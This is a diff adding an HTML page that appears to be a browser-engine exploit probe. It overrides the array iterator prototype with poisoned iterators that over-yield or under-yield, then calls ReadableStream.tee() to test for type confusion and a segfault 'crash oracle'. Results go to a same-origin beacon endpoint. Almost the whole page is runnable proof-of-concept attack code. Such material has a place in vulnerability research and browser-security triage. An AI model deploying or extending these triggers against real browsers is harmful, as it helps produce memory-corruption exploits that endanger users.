@@ -1,0 +1,64 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-v4 (dshpsyv4 fix)</title></head>
+<body><pre id="out">FA-v4 — sync XHR beacons, C0 unpoisoned, FA-4 crash-oracle last
+</pre><script>
+(function(){
+ "use strict";
+ var run = "fv4" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/FA-"+st+"/"+run, false);   // SYNC
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("beacon-err"+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYield(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonUnderYieldObj(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{fake:0}, done:false}; } }; }; }
+ function poisonUnderYieldPrim(){ return function(){ var arr=this,i=0;
+   return { next:function(){ if(i===1) return {done:true}; i++; return {value:0x1337, done:false}; } }; }; }
+ function v(id, label, poisonFn, work){
+   try {
+     beacon(id+"A", label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"B", "BUGLIVE=true; "+String(outx).slice(0,200));
+   } catch(e) {
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"E", "EXPECTED-threw ("+label.slice(0,40)+"): "+String(e).slice(0,160));
+   }
+ }
+ // C0: UNPOISONED control (the real empty-tee with our OWN default iterator)
+ try {
+   beacon("C0A","C0 unpoisoned control");
+   var rs0 = new ReadableStream({}); var p0 = rs0.tee();
+   beacon("C0B", "BUGLIVE=false;C0-CLEAN;pair.length="+p0.length+";respStreamOK=true");
+ } catch(e){ beacon("C0E","C0 threw: "+String(e).slice(0,120)); }
+ // FA-1: MIMO-V2-clone (real records + {} extra, over-yield — nuestra family-a signal)
+ v("1", "over-yield real-records-first", poisonOverYield, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     if (!(pair[0] instanceof ReadableStream)) throw "pair[0] not RS";
+     return "over-yield Accepted; locked="+pair[0].locked; });
+ // FA-2: deputy-write expected-throw (E-signal)
+ v("2", "deputy write on all-fake", poisonOverYield, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     var r = pair[0].getReader(); return "getReader ok typeof read="+(typeof r.read); });
+ // FA-3: writable record retrieval (confusion travel)
+ v("3", "writable-getWriter probe", poisonOverYield, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     return "getWriter typeof="+(typeof pair[1].getWriter); });
+ // FA-4b: second oracle (under-yield ONE object — MIMO V4)
+ v("4b", "second oracle under-yield-ONE-obj (LAST)", poisonUnderYieldObj, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee(); return "survived (the oracle did NOT fire)"; });
+ // FA-4: crash-oracle LAST (under-yield+primitive 0x1337 — empty-vector SEGV)
+ v("4", "crash oracle under-yield+primitive (LAST)", poisonUnderYieldPrim, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee(); return "survived (the oracle did NOT fire — bug not live)"; });
+ beacon("Z", "battery-complete (no crash tonight)");
+ say("FA-v4 battery complete");
+})();
+</script></body></html>
